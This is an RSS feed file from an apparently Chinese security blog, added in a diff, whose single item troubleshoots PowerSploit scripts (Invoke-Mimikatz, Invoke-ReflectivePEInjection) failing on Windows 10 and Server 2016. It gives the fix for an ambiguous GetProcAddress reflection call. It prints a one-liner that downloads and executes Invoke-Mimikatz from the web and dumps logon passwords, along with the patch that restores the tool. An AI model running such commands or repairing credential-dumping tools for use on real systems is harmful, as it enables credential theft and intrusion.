@@ -1,0 +1,162 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Powersploit on runshell</title>
+        <link>http://localhost:1313/tags/powersploit/</link>
+        <description>Recent content in Powersploit on runshell</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-CN</language>
+        <lastBuildDate>Sun, 15 Jul 2018 14:30:00 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/powersploit/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>powersploit中多个脚本在windows10和server2016上报错</title>
+        <link>http://localhost:1313/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/powersploit%E4%B8%AD%E5%A4%9A%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%9C%A8windows10%E5%92%8Cserver2016%E4%B8%8A%E6%8A%A5%E9%94%99/</link>
+        <pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate>
+        
+        <guid>http://localhost:1313/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/powersploit%E4%B8%AD%E5%A4%9A%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%9C%A8windows10%E5%92%8Cserver2016%E4%B8%8A%E6%8A%A5%E9%94%99/</guid>
+        <description>&lt;p&gt;报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;错误信息如下:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:\WINDOWS\system32&amp;gt; iex (New-Object System.Net.WebClient).DownloadString(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://raw.githubusercontent.com/PowerShe
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;llMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&amp;#39;&lt;/span&gt;);Invoke-Mimikatz -Command &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#34;privilege::debug&amp;#34; &amp;#34;sekurlsa::lo
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;gonPasswords full&amp;#34;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;使用&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt;个参数调用&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt;GetMethod&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt;时发生异常&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:“&lt;/span&gt;发现不明确的匹配&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;。”&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;所在位置 行&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;886&lt;/span&gt; 字符&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+         $GetProcAddress = $UnsafeNativeMethods.GetMethod(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;GetProcAddr ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    + CategoryInfo          &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; NotSpecified&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; (&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;) [], MethodInvocationException
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    + FullyQualifiedErrorId &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; AmbiguousMatchException
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;不能对 Null 值表达式调用方法&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;。&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;所在位置 行&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;893&lt;/span&gt; 字符&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    + CategoryInfo          &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; InvalidOperation&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; (&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;) []&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;，&lt;/span&gt;RuntimeException
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    + FullyQualifiedErrorId &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; InvokeMethodOnNull
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;找不到&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt;GetDelegateForFunctionPointer&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt;的重载&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;，&lt;/span&gt;参数计数为&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:“&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”。&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;所在位置 行&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;489&lt;/span&gt; 字符&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+         $VirtualAlloc = [&lt;span style=&#34;color:#66d9ef&#34;&gt;System.Runtime.InteropServices.Marshal&lt;/span&gt;]::Get ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    + CategoryInfo          &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; NotSpecified&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; (&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;) [], MethodException
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    + FullyQualifiedErrorId &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; MethodCountCouldNotFindBest
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.............
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...省略n行...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.............
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/PowerShellMafia/PowerSploit/issues/293&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;解决方法&lt;/a&gt;：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;请尝试更改该行：
+$GetProcAddress = $UnsafeNativeMethods.GetMethod(&amp;#39;GetProcAddress&amp;#39;)
+至
+$GetProcAddress = $UnsafeNativeMethods.GetMethod(&amp;#39;GetProcAddress&amp;#39;, [reflection.bindingflags] &amp;#34;Public,Static&amp;#34;, $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;报错分析：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;报错的第886行代码为&lt;code&gt;$GetProcAddress = $UnsafeNativeMethods.GetMethod(&#39;GetProcAddress&#39;)&lt;/code&gt;,它存在如下函数中：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt; Get-ProcAddress
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    &lt;span style=&#34;color:#66d9ef&#34;&gt;Param&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    (
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        [OutputType([&lt;span style=&#34;color:#66d9ef&#34;&gt;IntPtr&lt;/span&gt;])]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        [Parameter( &lt;span style=&#34;color:#a6e22e&#34;&gt;Position&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;Mandatory&lt;/span&gt; = $True )]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        [&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        $Module,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        [Parameter( &lt;span style=&#34;color:#a6e22e&#34;&gt;Position&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;Mandatory&lt;/span&gt; = $True )]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        [&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        $Procedure
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    &lt;span style=&#34;color:#75715e&#34;&gt;# Get a reference to System.dll in the GAC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    $SystemAssembly = [&lt;span style=&#34;color:#66d9ef&#34;&gt;AppDomain&lt;/span&gt;]::CurrentDomain.GetAssemblies() |
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        Where-Object { $_.GlobalAssemblyCache &lt;span style=&#34;color:#f92672&#34;&gt;-And&lt;/span&gt; $_.Location.Split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\\&amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;-1&lt;/span&gt;].Equals(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;System.dll&amp;#39;&lt;/span&gt;) }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    $UnsafeNativeMethods = $SystemAssembly.GetType(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Microsoft.Win32.UnsafeNativeMethods&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    &lt;span style=&#34;color:#75715e&#34;&gt;# Get a reference to the GetModuleHandle and GetProcAddress methods&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;GetModuleHandle&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		$GetProcAddress = $UnsafeNativeMethods.GetMethod(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;GetProcAddress&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# $GetProcAddress = $UnsafeNativeMethods.GetMethod(&amp;#39;GetProcAddress&amp;#39;, [reflection.bindingflags] &amp;#34;Public,Static&amp;#34;, $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    &lt;span style=&#34;color:#75715e&#34;&gt;# Get a handle to the module specified&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    $tmpPtr = New-Object IntPtr
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    &lt;span style=&#34;color:#75715e&#34;&gt;# Return the address of the function&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    Write-Output $GetProcAddress.Invoke($null, @([&lt;span style=&#34;color:#66d9ef&#34;&gt;System.Runtime.InteropServices.HandleRef&lt;/span&gt;]$HandleRef, $Procedure))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;该行代码由于在执行$UnsafeNativeMethods.GetMethod(&amp;lsquo;GetProcAddress&amp;rsquo;)的时候，$UnsafeNativeMethods有两个方法名都是GetProcAddress，显然是方法的重载，所以GetMethod(&amp;lsquo;GetProcAddress&amp;rsquo;)无法确定返回哪个方法，所以出现错误。powershell和其他shell一样，代码执行出错抛出异常后会继续执行后面的代码。它不像python、php这些脚本语言，抛出异常后会终止程序。所以后面的报错是因为第一个错误产生的。&lt;/p&gt;
+&lt;p&gt;以下是$UnsafeNativeMethods.GetMethod(&amp;lsquo;GetProcAddress&amp;rsquo;)的两个可能的值，必须想办法让它确定下来，方法之一则是“暂时解决办法”提到的那样。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Name                       : GetProcAddress
+DeclaringType              : Microsoft.Win32.UnsafeNativeMethods
+ReflectedType              : Microsoft.Win32.UnsafeNativeMethods
+MemberType                 : Method
+MetadataToken              : 100663839
+Module                     : System.dll
+IsSecurityCritical         : True
+IsSecuritySafeCritical     : True
+IsSecurityTransparent      : False
+MethodHandle               : System.RuntimeMethodHandle
+Attributes                 : PrivateScope, Public, Static, HideBySig, PinvokeImpl
+CallingConvention          : Standard
+ReturnType                 : System.IntPtr
+ReturnTypeCustomAttributes : IntPtr
+ReturnParameter            : IntPtr
+IsGenericMethod            : False
+IsGenericMethodDefinition  : False
+ContainsGenericParameters  : False
+MethodImplementationFlags  : PreserveSig
+IsPublic                   : True
+IsPrivate                  : False
+IsFamily                   : False
+IsAssembly                 : False
+IsFamilyAndAssembly        : False
+IsFamilyOrAssembly         : False
+IsStatic                   : True
+IsFinal                    : False
+IsVirtual                  : False
+IsHideBySig                : True
+IsAbstract                 : False
+IsSpecialName              : False
+IsConstructor              : False
+CustomAttributes           : {[System.Runtime.InteropServices.DllImportAttribute(&amp;#34;kernel32.dll&amp;#34;, EntryPoint = &amp;#34;GetProcAddress&amp;#34;, CharSet = 2, ExactSpelling = True, SetLastError = True, PreserveSig = True, CallingConvention = 1, BestFitMapping = False, ThrowOnUnmappableChar = False)], [System.Runtime.InteropServices.PreserveSigAttribute()]}
+
+Name                       : GetProcAddress
+DeclaringType              : Microsoft.Win32.UnsafeNativeMethods
+ReflectedType              : Microsoft.Win32.UnsafeNativeMethods
+MemberType                 : Method
+MetadataToken              : 100663864
+Module                     : System.dll
+IsSecurityCritical         : True
+IsSecuritySafeCritical     : True
+IsSecurityTransparent      : False
+MethodHandle               : System.RuntimeMethodHandle
+Attributes                 : PrivateScope, Public, Static, HideBySig, PinvokeImpl
+CallingConvention          : Standard
+ReturnType                 : System.IntPtr
+ReturnTypeCustomAttributes : IntPtr
+ReturnParameter            : IntPtr
+IsGenericMethod            : False
+IsGenericMethodDefinition  : False
+ContainsGenericParameters  : False
+MethodImplementationFlags  : PreserveSig
+IsPublic                   : True
+IsPrivate                  : False
+IsFamily                   : False
+IsAssembly                 : False
+IsFamilyAndAssembly        : False
+IsFamilyOrAssembly         : False
+IsStatic                   : True
+IsFinal                    : False
+IsVirtual                  : False
+IsHideBySig                : True
+IsAbstract                 : False
+IsSpecialName              : False
+IsConstructor              : False
+CustomAttributes           : {[System.Runtime.InteropServices.DllImportAttribute(&amp;#34;kernel32.dll&amp;#34;, EntryPoint = &amp;#34;GetProcAddress&amp;#34;, CharSet = 2, ExactSpelling = False, SetLastError = False, PreserveSig = True, CallingConvention = 1, BestFitMapping = False, ThrowOnUnmappableChar = False)], [System.Runtime.InteropServices.PreserveSigAttribute()]}
+&lt;/code&gt;&lt;/pre&gt;</description>
+        </item>
+        
+    </channel>
+</rss>
